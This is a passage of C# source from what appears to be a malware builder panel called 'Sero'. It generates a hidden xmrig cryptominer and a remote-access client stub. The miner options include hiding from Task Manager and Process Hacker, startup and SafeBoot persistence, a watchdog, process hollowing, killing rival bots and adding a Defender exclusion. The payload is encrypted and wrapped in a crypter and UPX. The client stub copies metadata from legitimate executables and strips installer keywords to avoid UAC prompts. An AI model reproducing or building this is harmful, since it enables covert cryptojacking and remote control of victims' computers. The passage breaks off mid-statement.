        _bldXmrigBytes = null;
        _bldXmrigPath  = null;
        BldMnrXmrigPath.Text       = Lang.Get("MNR_XMRIG_MISSING");
        BldMnrXmrigPath.Foreground = new SolidColorBrush(Color.FromRgb(0xEF, 0x44, 0x44));
    }

    private string GenerateMinerConfigCs()
    {
        static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        int.TryParse(BldMnrCpuIdle.Text,       out int cpuIdle);   if (cpuIdle   < 0 || cpuIdle   > 100) cpuIdle   = 75;
        int.TryParse(BldMnrCpuActive.Text,     out int cpuActive); if (cpuActive < 0 || cpuActive > 100) cpuActive = 50;
        int.TryParse(BldMnrIdleSec.Text,       out int idleSec);   if (idleSec  < 5)                    idleSec   = 30;
        if (_bldSfcSeed == null)
        {
            Log("[!] Miner: SFC seed not initialized — run 'Load xmrig' first.");
            return "";
        }
        string sfcSeedB64 = Convert.ToBase64String(_bldSfcSeed);

        return $@"namespace MinerStub;

internal static class MinerConfig
{{
    public const string PoolUrl          = ""{Esc(BldMnrPool.Text.Trim())}"";
    public const bool   PoolTls          = {(BldMnrTls.IsChecked == true ? "true" : "false")};
    public const string Wallet           = ""{Esc(BldMnrWallet.Text.Trim())}"";
    public const string Password         = ""{Esc(BldMnrPass.Text.Trim())}"";
    public const string WorkerName       = ""{Esc(BldMnrWorkerName.Text.Trim())}"";
    public const string Algo             = ""{Esc(BldMnrAlgo.Text.Trim())}"";
    public const int    MaxCpuIdle       = {cpuIdle};
    public const int    MaxCpuActive     = {cpuActive};
    public const int    IdleThresholdSec = {idleSec};
    public const string InstallName      = ""{Esc(BldMnrInstallName.Text.Trim())}"";
    public const string StealthProcs     = ""{(BldMnrStealth.IsChecked == true ? "taskmgr.exe,procexp.exe,procexp64.exe,systeminformer.exe,processhacker.exe" : "")}"";
    public const bool   EnableStartup    = {(BldMnrStartup.IsChecked    == true ? "true" : "false")};
    public const bool   EnableSafeBoot   = {(BldMnrSafeBoot.IsChecked   == true ? "true" : "false")};
    public const bool   EnableWatchdog   = {(BldMnrWatchdog.IsChecked   == true ? "true" : "false")};
    public const bool   DisableSleep     = {(BldMnrDisableSleep.IsChecked == true ? "true" : "false")};
    public const bool   EnableHollowing  = {(BldMnrHollow.IsChecked      == true ? "true" : "false")};
    public const string HollowTarget     = ""{Esc(BldMnrHollowTarget.Text.Trim())}"";
    public const bool   EnableBotKiller          = {(BldMnrBotKiller.IsChecked == true ? "true" : "false")};
    public const bool   EnableDefenderExclusion  = true;
    public const string StatsUrl         = ""http://{Esc(GetPrimaryHost())}:{MinerStatsPort}/api/report"";
    public const string StatsToken       = ""{Esc(EnsureMinerToken())}"";
    public const string SfcSeed          = ""{sfcSeedB64}"";
}}
";
    }

    private async void BldMnrBuild_Click(object sender, RoutedEventArgs e)
    {
        var minerDir = GetMinerStubProjectDir();
        if (string.IsNullOrEmpty(minerDir) || !Directory.Exists(minerDir))
        {
            TxtMnrBuildStatus.Text = Lang.Get("MNR_ERR_NO_PROJ");
            return;
        }
        if (_bldXmrigBytes == null || _bldXmrigBytes.Length == 0)
        {
            TxtMnrBuildStatus.Text = Lang.Get("MNR_ERR_NO_XMRIG");
            return;
        }

        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter   = "Executable (*.exe)|*.exe",
            FileName = "miner.exe",
            Title    = "Save miner executable"
        };
        if (dlg.ShowDialog() != true) return;
        var outputExe = dlg.FileName;

        BtnMnrBuild.IsEnabled  = false;
        TxtMnrBuildStatus.Text = Lang.Get("MNR_STATUS_GEN");

        try
        {
            // Generate random SFC64 seed for this build, then write encrypted MinerConfig + xmrig.bin
            _bldSfcSeed = new byte[32];
            System.Security.Cryptography.RandomNumberGenerator.Fill(_bldSfcSeed);

            var cfgPath = Path.Combine(minerDir, "MinerConfig.cs");
            var minerCfg = GenerateMinerConfigCs();
            if (string.IsNullOrEmpty(minerCfg)) return; // XOR key not ready (logged in GenerateMinerConfigCs)
            await File.WriteAllTextAsync(cfgPath, minerCfg);

            // Deflate-compress then XOR-encrypt xmrig before embedding
            var xmrigBinDst = Path.Combine(minerDir, "xmrig.bin");
            if (_bldXmrigBytes != null && _bldXmrigBytes.Length > 0)
            {
                using var compMs = new System.IO.MemoryStream();
                using (var deflate = new System.IO.Compression.DeflateStream(compMs, System.IO.Compression.CompressionLevel.Optimal, leaveOpen: true))
                    deflate.Write(_bldXmrigBytes, 0, _bldXmrigBytes.Length);
                var compressed = compMs.ToArray();
                await File.WriteAllBytesAsync(xmrigBinDst, SfcEncode(compressed, _bldSfcSeed!));
            }

            TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_COMPILE");
            Log("[*] MinerBuilder: dotnet publish…");

            var tempOut    = Path.Combine(Path.GetTempPath(), "sero_miner_" + Guid.NewGuid().ToString("N")[..8]);
            var csprojPath = Path.Combine(minerDir, "MinerStub.csproj");
            var ilcThreads = Math.Min(Environment.ProcessorCount, 8);
            var publishArgs = $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Size -p:IlcGenerateStackTraceData=false -p:IlcFoldIdenticalMethodBodies=true -p:IlcMaxParallelism={ilcThreads} -o \"{tempOut}\"";

            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName               = "dotnet",
                Arguments              = publishArgs,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
                WorkingDirectory       = minerDir,
            };
            var vsInstaller = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Microsoft Visual Studio", "Installer");
            if (Directory.Exists(vsInstaller))
                psi.Environment["PATH"] = vsInstaller + ";" + Environment.GetEnvironmentVariable("PATH");

            using var proc       = System.Diagnostics.Process.Start(psi)!;
            var stdoutTask       = proc.StandardOutput.ReadToEndAsync();
            var stderrTask       = proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();
            var stdout = await stdoutTask;
            var stderr = await stderrTask;

            if (proc.ExitCode != 0)
            {
                Log($"[!] MinerBuilder: Build failed (exit {proc.ExitCode})");
                foreach (var line in stderr.Split('\n'))
                {
                    var l = line.Trim();
                    if (l.Length > 0 && (l.Contains("error", StringComparison.OrdinalIgnoreCase) ||
                                         l.Contains("warning", StringComparison.OrdinalIgnoreCase) ||
                                         l.Contains("FAILED", StringComparison.OrdinalIgnoreCase)))
                        Log("[!] " + l);
                }
                TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_FAILED");
                return;
            }

            var builtExe = Directory.GetFiles(tempOut, "*.exe").FirstOrDefault();
            if (builtExe == null) { TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_NO_OUTPUT"); return; }

            File.Copy(builtExe, outputExe, true);
            try { Directory.Delete(tempOut, true); } catch { }
            // Clean up the temporary xmrig.bin resource file from the project dir
            try { File.Delete(xmrigBinDst); } catch { }

            if (BldMnrEncrypt.IsChecked == true)
            {
                TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_CRYPTER");
                Log("[*] MinerBuilder: applying C++ crypter…");
                try { await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconPath: null, metadata: null, uacBypass: false); Log("[+] MinerBuilder: crypter applied."); }
                catch (Exception cex) { Log($"[!] MinerBuilder: crypter skipped — {cex.Message}"); }
            }

            if (BldMnrUpx.IsChecked == true)
            {
                TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_UPX");
                Log("[*] MinerBuilder: Running UPX…");
                string upxExe = "upx";
                var toolsUpx = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "upx.exe");
                if (File.Exists(toolsUpx)) upxExe = toolsUpx;
                var upxPsi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = upxExe,
                    Arguments = $"--best --lzma \"{outputExe}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                try
                {
                    using var upxProc = System.Diagnostics.Process.Start(upxPsi)!;
                    await upxProc.StandardOutput.ReadToEndAsync();
                    await upxProc.StandardError.ReadToEndAsync();
                    await upxProc.WaitForExitAsync();
                    if (upxProc.ExitCode == 0) Log("[+] MinerBuilder: UPX compression applied.");
                    else Log($"[!] MinerBuilder: UPX failed (exit {upxProc.ExitCode}) — skipped.");
                }
                catch { Log("[!] MinerBuilder: UPX not found — skipped. Put upx.exe in PATH or tools/."); }
            }

            // Generate PS1 uninstaller script
            var uninstallerPs1 = Path.Combine(
                Path.GetDirectoryName(outputExe)!,
                Path.GetFileNameWithoutExtension(outputExe) + "_uninstall.ps1");
            await File.WriteAllTextAsync(uninstallerPs1, GenerateUninstallerScript());
            Log($"[+] MinerBuilder: PS1 uninstaller → {Path.GetFileName(uninstallerPs1)}");

            // Build silent uninstaller .exe from miner-uninstaller project
            TxtMnrBuildStatus.Text = Lang.Get("MNR_STATUS_UNINST");
            var uninstallerExePath = Path.Combine(
                Path.GetDirectoryName(outputExe)!,
                Path.GetFileNameWithoutExtension(outputExe) + "_uninstall.exe");
            await BuildUninstallerExeAsync(uninstallerExePath);

            var size = new FileInfo(outputExe).Length;
            Log($"[+] MinerBuilder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
            TxtMnrBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({size / 1024} KB)";
            MessageBox.Show(string.Format(Lang.Get("MINER_BUILT_MSG"), Path.GetFileName(outputExe), size / 1024, Path.GetFileName(uninstallerExePath)),
                "Sero — Miner Built", MessageBoxButton.OK, MessageBoxImage.Information);
        }
        catch (Exception ex)
        {
            Log($"[!] MinerBuilder: {ex.Message}");
            TxtMnrBuildStatus.Text = $"Error: {ex.Message}";
        }
        finally { BtnMnrBuild.IsEnabled = true; }
    }

    private string GetMinerUninstallerProjectDir()
    {
        var serverExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
        var candidates = new[]
        {
            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "miner-uninstaller"),
            Path.Combine(serverExeDir, "..", "..", "..", "..", "miner-uninstaller"),
            Path.Combine(serverExeDir, "..", "miner-uninstaller"),
        };
        foreach (var c in candidates)
        {
            var full = Path.GetFullPath(c);
            if (Directory.Exists(full)) return full;
        }
        return candidates[0];
    }

    private async Task BuildUninstallerExeAsync(string outputExePath)
    {
        try
        {
            var uninstDir = GetMinerUninstallerProjectDir();
            if (!Directory.Exists(uninstDir)) { Log("[!] miner-uninstaller/ not found — skipping exe uninstaller."); return; }

            // Write UninstallerConfig.cs with baked-in install name, hollow target and watchdog flag
            var installName    = BldMnrInstallName.Text.Trim();
            var hollowTarget   = (BldMnrHollow.IsChecked == true) ? GetHollowTarget() : "";
            var enableWatchdog = BldMnrWatchdog.IsChecked == true;
            var cfgContent = $@"namespace MinerUninstaller;
internal static class UninstallerConfig
{{
    public const string InstallName    = ""{installName.Replace("\"", "\\\"")}"";
    public const string HollowTarget   = ""{hollowTarget.Replace("\"", "\\\"")}"";
    public const bool   EnableWatchdog = {(enableWatchdog ? "true" : "false")};
}}
";
            await File.WriteAllTextAsync(Path.Combine(uninstDir, "UninstallerConfig.cs"), cfgContent);

            var tempOut = Path.Combine(Path.GetTempPath(), "sero_uninst_" + Guid.NewGuid().ToString("N")[..8]);
            var psi = new System.Diagnostics.ProcessStartInfo("dotnet",
                $"publish \"{Path.Combine(uninstDir, "MinerUninstaller.csproj")}\" -c Release -r win-x64 --sc true -o \"{tempOut}\" --nologo")
            {
                CreateNoWindow  = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
            };
            using var proc = System.Diagnostics.Process.Start(psi)!;
            await proc.WaitForExitAsync();

            var builtExe = Directory.GetFiles(tempOut, "*.exe").FirstOrDefault();
            if (builtExe != null)
            {
                File.Copy(builtExe, outputExePath, true);
                Log($"[+] MinerBuilder: uninstaller.exe → {Path.GetFileName(outputExePath)} ({new FileInfo(outputExePath).Length / 1024} KB)");
            }
            else
            {
                Log($"[!] MinerBuilder: uninstaller.exe build failed (exit {proc.ExitCode}).");
            }
            try { Directory.Delete(tempOut, true); } catch { }
        }
        catch (Exception ex) { Log($"[!] MinerBuilder: uninstaller.exe error — {ex.Message}"); }
    }

    private string GenerateUninstallerScript()
    {
        static string Esc(string s) => s.Replace("'", "''");
        var installName = BldMnrInstallName.Text.Trim();
        var folderName  = installName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
                          ? installName[..^4] : installName;
        var taskMain    = $@"\Microsoft\Windows\{folderName}";
        var taskWd      = $@"\Microsoft\Windows\{folderName}Wd";

        return $@"# Miner uninstaller — run as admin
# Auto-elevate
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
    Start-Process powershell -ArgumentList ""-ExecutionPolicy Bypass -File `""$PSCommandPath`"""" -Verb RunAs; exit
}}

$installName = '{Esc(installName)}'
$folderName  = '{Esc(folderName)}'
$installDir  = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft', 'Windows', $folderName)
$taskMain    = '{Esc(taskMain)}'
$taskWd      = '{Esc(taskWd)}'

Write-Host '=== Miner Uninstaller ===' -ForegroundColor Cyan

# 1. Delete scheduled tasks (stop auto-restart)
schtasks /delete /tn $taskMain /f 2>&1 | Out-Null
schtasks /delete /tn $taskWd  /f 2>&1 | Out-Null
Write-Host '[OK] Scheduled tasks removed'

# 2. Enable SeDebugPrivilege to bypass protected-process DACL
Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class MK {{
    [DllImport(""ntdll.dll"")] public static extern int RtlAdjustPrivilege(int p,bool e,bool t,out bool v);
    [DllImport(""kernel32.dll"",SetLastError=true)] public static extern IntPtr OpenProcess(uint a,bool i,int p);
    [DllImport(""kernel32.dll"")] public static extern bool TerminateProcess(IntPtr h,uint c);
    [DllImport(""kernel32.dll"")] public static extern bool CloseHandle(IntPtr h);
    [DllImport(""ntdll.dll"")] public static extern int NtSetInformationProcess(IntPtr h,int c,ref uint v,int s);
}}
'@ -ErrorAction SilentlyContinue
$vv=$false; [MK]::RtlAdjustPrivilege(20,$true,$false,[ref]$vv) | Out-Null
Write-Host '[OK] SeDebugPrivilege enabled'

# 3. Kill miner processes (removes critical flag first to avoid BSOD)
$procs = Get-Process -Name $folderName -ErrorAction SilentlyContinue | Sort-Object {{ $_.Threads.Count }} -Descending
foreach ($p in $procs) {{
    $h = [MK]::OpenProcess(0x1FFFFF,$false,$p.Id)
    if ($h -ne [IntPtr]::Zero) {{
        $z=[uint32]0; [MK]::NtSetInformationProcess($h,0x1D,[ref]$z,4) | Out-Null
        $ok=[MK]::TerminateProcess($h,0); [MK]::CloseHandle($h) | Out-Null
        if ($ok) {{ Write-Host ""[OK] Killed PID $($p.Id) ($($p.Threads.Count) threads)"" }}
    }}
}}

# 4. Delete install directory
Start-Sleep -Milliseconds 500
if (Test-Path $installDir) {{
    Remove-Item $installDir -Recurse -Force -ErrorAction SilentlyContinue
    Start-Sleep 1
    Remove-Item $installDir -Recurse -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $installDir)) {{ Write-Host '[OK] Install directory removed' }}
    else {{ Write-Host '[!] Could not fully remove install directory' }}
}}

# 5. SafeBoot registry cleanup
foreach ($mode in @('Network','Minimal')) {{
    $key = ""HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\$mode\$folderName""
    if (Test-Path $key) {{ Remove-Item $key -Force; Write-Host ""[OK] Removed SafeBoot key ($mode)"" }}
}}

# 6. Service cleanup
$svc = Get-Service $folderName -ErrorAction SilentlyContinue
if ($svc) {{
    sc.exe stop   $folderName 2>&1 | Out-Null
    sc.exe delete $folderName 2>&1 | Out-Null
    Write-Host '[OK] Service removed'
}}

Write-Host ''
Write-Host '[DONE] Miner fully removed. Safe to reboot.' -ForegroundColor Green
Read-Host 'Press Enter to close'
";
    }


    private void BldMnrSaveConfig_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter   = "JSON (*.json)|*.json",
            FileName = "miner_config.json",
            Title    = "Save miner config"
        };
        if (dlg.ShowDialog() != true) return;
        try
        {
            var obj = new System.Text.Json.Nodes.JsonObject
            {
                ["Pool"]         = BldMnrPool.Text,
                ["Wallet"]       = BldMnrWallet.Text,
                ["Password"]     = BldMnrPass.Text,
                ["WorkerName"]   = BldMnrWorkerName.Text,
                ["Algo"]         = BldMnrAlgo.Text,
                ["CpuIdle"]      = BldMnrCpuIdle.Text,
                ["CpuActive"]    = BldMnrCpuActive.Text,
                ["IdleSec"]      = BldMnrIdleSec.Text,
                ["InstallName"]  = BldMnrInstallName.Text,
                ["StealthProcs"] = BldMnrStealth.IsChecked == true ? "1" : "0",
                ["StatsToken"]   = EnsureMinerToken(),
                ["DisableSleep"]  = BldMnrDisableSleep.IsChecked == true,
                ["Startup"]      = BldMnrStartup.IsChecked   == true,
                ["SafeBoot"]        = BldMnrSafeBoot.IsChecked    == true,
                ["Watchdog"]        = BldMnrWatchdog.IsChecked   == true,
                ["AntiKill"]        = BldMnrWatchdog.IsChecked   == true,
                ["BotKiller"]       = BldMnrBotKiller.IsChecked  == true,
                ["Hollow"]          = BldMnrHollow.IsChecked     == true,
                ["HollowTarget"] = BldMnrHollowTarget.Text,
                ["Encrypt"]      = BldMnrEncrypt.IsChecked  == true,
            };
            File.WriteAllText(dlg.FileName, obj.ToJsonString(new System.Text.Json.JsonSerializerOptions { WriteIndented = true }));
            TxtMnrBuildStatus.Text = $"Config saved: {Path.GetFileName(dlg.FileName)}";
        }
        catch (Exception ex) { TxtMnrBuildStatus.Text = $"Save error: {ex.Message}"; }
    }

    private void BldMnrLoadConfig_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "JSON (*.json)|*.json",
            Title  = "Load miner config"
        };
        if (dlg.ShowDialog() != true) return;
        try
        {
            var json = File.ReadAllText(dlg.FileName);
            var obj  = System.Text.Json.Nodes.JsonNode.Parse(json)!.AsObject();
            string? Get(string k) => obj.TryGetPropertyValue(k, out var v) ? v?.GetValue<string>() : null;
            bool?   GetB(string k) => obj.TryGetPropertyValue(k, out var v) ? v?.GetValue<bool>() : null;

            if (Get("Pool")         is string pool)  BldMnrPool.Text         = pool;
            if (Get("Wallet")       is string w)     BldMnrWallet.Text        = w;
            if (Get("Password")     is string p)     BldMnrPass.Text          = p;
            if (Get("WorkerName")   is string wn)    BldMnrWorkerName.Text    = wn;
            if (Get("Algo")         is string algo)  BldMnrAlgo.Text          = algo;
            if (Get("CpuIdle")      is string ci)    BldMnrCpuIdle.Text       = ci;
            if (Get("CpuActive")    is string ca)    BldMnrCpuActive.Text     = ca;
            if (Get("IdleSec")      is string id)    BldMnrIdleSec.Text       = id;
            if (Get("InstallName")  is string ins)   BldMnrInstallName.Text   = ins;
            if (Get("StealthProcs") is string sp)    BldMnrStealth.IsChecked  = sp == "1" || (sp != "0" && sp.Length > 0);
            if (Get("StatsToken")   is string tok)   _mnrStatsToken           = tok;
            if (Get("HollowTarget") is string ht)    BldMnrHollowTarget.Text  = ht;
            if (GetB("DisableSleep") is bool ds)  BldMnrDisableSleep.IsChecked = ds;
            if (GetB("Startup")     is bool st)  BldMnrStartup.IsChecked   = st;
            if (GetB("SafeBoot")    is bool sb)  BldMnrSafeBoot.IsChecked  = sb;
            if (GetB("Watchdog")    is bool wd)  BldMnrWatchdog.IsChecked  = wd;
            if (GetB("AntiKill")    is bool ak && ak)  BldMnrWatchdog.IsChecked = true;
            if (GetB("BotKiller")   is bool bk)  BldMnrBotKiller.IsChecked = bk;
            if (GetB("Hollow")      is bool ho)  BldMnrHollow.IsChecked   = ho;
            if (GetB("Encrypt")     is bool en)  BldMnrEncrypt.IsChecked  = en;
            TxtMnrBuildStatus.Text = $"Config loaded: {Path.GetFileName(dlg.FileName)}";
        }
        catch (Exception ex) { TxtMnrBuildStatus.Text = $"Load error: {ex.Message}"; }
    }

    private void BtnPageRat_Click(object sender, RoutedEventArgs e)
    {
        PageRat.Visibility = Visibility.Visible;
        PageXmr.Visibility = Visibility.Collapsed;
        BtnPageRat.Opacity = 1.0;
        BtnPageXmr.Opacity = 0.55;
    }

    private void BtnPageXmr_Click(object sender, RoutedEventArgs e)
    {
        PageRat.Visibility = Visibility.Collapsed;
        PageXmr.Visibility = Visibility.Visible;
        BtnPageRat.Opacity = 0.55;
        BtnPageXmr.Opacity = 1.0;
        AutoDetectXmrig();
    }

    private string GetPrimaryHost()
    {
        // Get first host from ListBox, or first from comma-separated, or default
        if (BldHosts.Items.Count > 0)
            return (BldHosts.Items[0] as string) ?? "127.0.0.1";
        return "127.0.0.1";
    }

    private void BldAddHost_Click(object sender, RoutedEventArgs e)
    {
        var hostInput = BldHostInput.Text.Trim();
        if (!string.IsNullOrEmpty(hostInput) && !BldHosts.Items.Contains(hostInput))
        {
            BldHosts.Items.Add(hostInput);
            BldHostInput.Clear();
        }
    }

    private void BldDelHost_Click(object sender, RoutedEventArgs e)
    {
        if (BldHosts.SelectedIndex >= 0)
            BldHosts.Items.RemoveAt(BldHosts.SelectedIndex);
    }


    private void BldUsePastebin_Checked(object sender, RoutedEventArgs e)
    {
        BldHosts.IsEnabled = false;
        BldHostInput.IsEnabled = false;
        BldPort.IsEnabled = false;
        BldPastebinUrl.IsEnabled = true;
    }

    private void BldUsePastebin_Unchecked(object sender, RoutedEventArgs e)
    {
        BldHosts.IsEnabled = true;
        BldHostInput.IsEnabled = true;
        BldPort.IsEnabled = true;
        BldPastebinUrl.IsEnabled = false;
    }


    private void ApplyIcon(string exePath, string iconPath)
    {
        try
        {
            // Try multiple locations for rcedit.exe
            var candidates = new[]
            {
                Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "..", "rcedit.exe")), // repo root (bin/Release/net10.0-windows/ → 4 levels up)
                Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "rcedit.exe")), // fallback 3 levels
                "rcedit.exe", // PATH
            };

            string? rceditPath = null;
            foreach (var candidate in candidates)
            {
                if (File.Exists(candidate))
                {
                    rceditPath = candidate;
                    break;
                }
            }

            if (rceditPath == null)
            {
                Log($"[!] Builder: rcedit.exe not found. Icon not applied.");
                return;
            }


            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = rceditPath,
                Arguments = $"\"{exePath}\" --set-icon \"{iconPath}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using var process = System.Diagnostics.Process.Start(psi);
            if (process != null)
            {
                process.WaitForExit();
                if (process.ExitCode == 0)
                {
                    Log($"[+] Builder: Icon applied successfully");
                }
                else
                {
                    Log($"[!] Builder: rcedit failed (exit code {process.ExitCode})");
                }
            }
        }
        catch (Exception ex)
        {
            Log($"[!] Builder: Icon application error: {ex.Message}");
        }
    }

    private void BldSetAssembly_Checked(object sender, RoutedEventArgs e)
    {
        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable files (*.exe)|*.exe",
            Title = "Select executable file"
        };
        if (dialog.ShowDialog() == true)
        {
            // Store the full path in Tag for use in Build_Click
            BldAssemblyPath.Tag = dialog.FileName;
            // Display only the filename
            BldAssemblyPath.Text = Path.GetFileName(dialog.FileName);
        }
        else
        {
            BldSetAssembly.IsChecked = false;
        }
    }

    private void BldSetAssembly_Unchecked(object sender, RoutedEventArgs e)
    {
        BldAssemblyPath.Text = Lang.Get("BLD_NO_EXE");
        BldAssemblyPath.Tag = null;
    }

    private void BldSetIcon_Checked(object sender, RoutedEventArgs e)
    {
        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Icon files (*.ico)|*.ico",
            Title = "Select icon file"
        };
        if (dialog.ShowDialog() == true)
        {
            BldIconPath.Text = dialog.FileName;
        }
        else
        {
            // User cancelled, uncheck the checkbox
            BldSetIcon.IsChecked = false;
        }
    }

    private void BldSetIcon_Unchecked(object sender, RoutedEventArgs e)
    {
        BldIconPath.Text = Lang.Get("BLD_NO_ICON");
    }

    private async void Build_Click(object sender, RoutedEventArgs e)
    {
        if (BldHosts.Items.Count == 0)
        {
            MessageBox.Show(Lang.Get("BLD_NO_HOST_MSG"), Lang.Get("BLD_NO_HOST_TITLE"),
                MessageBoxButton.OK, MessageBoxImage.Warning);
            return;
        }

        var stubDir = GetStubProjectDir();
        if (!Directory.Exists(stubDir))
        {
            Log("[!] Builder: stub/ project not found.");
            TxtBuildStatus.Text = $"Error: {stubDir} not found";
            return;
        }

        // Determine assembly name from selected executable
        string assemblyName = "SeroStub";
        string? selectedExePath = null;

        if (BldSetAssembly.IsChecked == true && BldAssemblyPath.Tag != null)
        {
            selectedExePath = BldAssemblyPath.Tag.ToString()!;
            if (selectedExePath != null && File.Exists(selectedExePath))
            {
                assemblyName = Path.GetFileNameWithoutExtension(selectedExePath);
            }
        }

        var dialogBuild = new Microsoft.Win32.SaveFileDialog
        {
            Filter = "Executable (*.exe)|*.exe",
            FileName = string.Empty,
            Title = "Save built client"
        };
        if (dialogBuild.ShowDialog() != true) return;

        var outputExe = dialogBuild.FileName;

        BtnBuild.IsEnabled = false;
        BuilderPanel.IsEnabled = false;
        TxtBuildStatus.Text = Lang.Get("BLD_STATUS_GEN");
        Log("[*] Builder: Starting build...");

        try
        {
            var configPath = Path.Combine(stubDir, "Config.cs");
            await File.WriteAllTextAsync(configPath, GenerateConfigCs());

            var csprojPath = Path.Combine(stubDir, "SeroStub.csproj");
            var csproj = await File.ReadAllTextAsync(csprojPath);

            // Extract metadata from selected executable if checkbox is checked
            var assemblyTitle = assemblyName;
            var company = string.Empty;
            var product = string.Empty;
            var fileVersion = "1.0.0.0";
            var productVersion = "1.0.0.0";
            var copyright = string.Empty;

            if (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
            {
                try
                {
                    var versionInfo = System.Diagnostics.FileVersionInfo.GetVersionInfo(selectedExePath);

                    if (!string.IsNullOrWhiteSpace(versionInfo.ProductName))
                        product = versionInfo.ProductName.Trim();
                    if (!string.IsNullOrWhiteSpace(versionInfo.CompanyName))
                        company = versionInfo.CompanyName.Trim();
                    if (!string.IsNullOrWhiteSpace(versionInfo.FileVersion))
                    {
                        fileVersion = versionInfo.FileVersion.Trim();
                        // Clean version - keep only numeric version (e.g., "0.18.4.5" from "0.18.4.5-b1a6201...")
                        var parts = fileVersion.Split(new[] { '-', '+', ' ' }, System.StringSplitOptions.None);
                        if (parts.Length > 0 && !string.IsNullOrEmpty(parts[0]))
                            fileVersion = parts[0];
                    }

                    // Use FileVersion for ProductVersion to avoid random characters
                    productVersion = fileVersion; // Force use of cleaned FileVersion

                    if (!string.IsNullOrWhiteSpace(versionInfo.FileDescription))
                        assemblyTitle = versionInfo.FileDescription.Trim();

                    // Extract copyright - try multiple sources
                    if (!string.IsNullOrWhiteSpace(versionInfo.LegalCopyright))
                        copyright = versionInfo.LegalCopyright.Trim();

                    Log($"[+] Builder: Metadata cloned from {Path.GetFileName(selectedExePath)}");
                }
                catch (Exception ex)
                {
                    Log($"[!] Builder: Could not extract metadata: {ex.Message}");
                }
            }

            if (string.IsNullOrEmpty(assemblyTitle)) assemblyTitle = "";
            if (string.IsNullOrEmpty(company)) company = "";
            if (string.IsNullOrEmpty(product)) product = "";
            if (string.IsNullOrEmpty(fileVersion)) fileVersion = "1.0.0.0";
            if (string.IsNullOrEmpty(productVersion)) productVersion = fileVersion;

            // Windows "Installer Detection" heuristic scans PE metadata for these
            // keywords and forces a UAC elevation popup even without a manifest.
            // Strip them from any copied field to prevent the popup on the client.
            static string StripInstallerKeywords(string s)
            {
                if (string.IsNullOrEmpty(s)) return s;
                var triggers = new[] { "setup", "install", "update", "patch",
                                       "upgrade", "deploy", "wizard", "launcher",
                                       "bootstrap", "uninstall", "repair" };
                foreach (var t in triggers)
                    s = System.Text.RegularExpressions.Regex.Replace(
                            s, t, "", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                return s.Trim();
            }
            assemblyTitle  = StripInstallerKeywords(assemblyTitle);
            product        = StripInstallerKeywords(product);
            assemblyName   = StripInstallerKeywords(assemblyName);

            // Escape XML special characters
            var escapeXml = (string s) => System.Security.SecurityElement.Escape(s) ?? s;
            assemblyName = escapeXml(assemblyName);
            assemblyTitle = escapeXml(assemblyTitle);
            company = escapeXml(company);
            product = escapeXml(product);
            fileVersion = escapeXml(fileVersion);
            productVersion = escapeXml(productVersion);
            copyright = escapeXml(copyright);

            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<AssemblyName>[^<]*</AssemblyName>", $"<AssemblyName>{assemblyName}</AssemblyName>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<AssemblyTitle>[^<]*</AssemblyTitle>", $"<AssemblyTitle>{assemblyTitle}</AssemblyTitle>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Description>[^<]*</Description>", $"<Description>{assemblyTitle}</Description>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Product>[^<]*</Product>", $"<Product>{product}</Product>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Company>[^<]*</Company>", $"<Company>{company}</Company>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<FileVersion>[^<]*</FileVersion>", $"<FileVersion>{fileVersion}</FileVersion>");

            // Update or add Copyright
            if (csproj.Contains("<Copyright>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
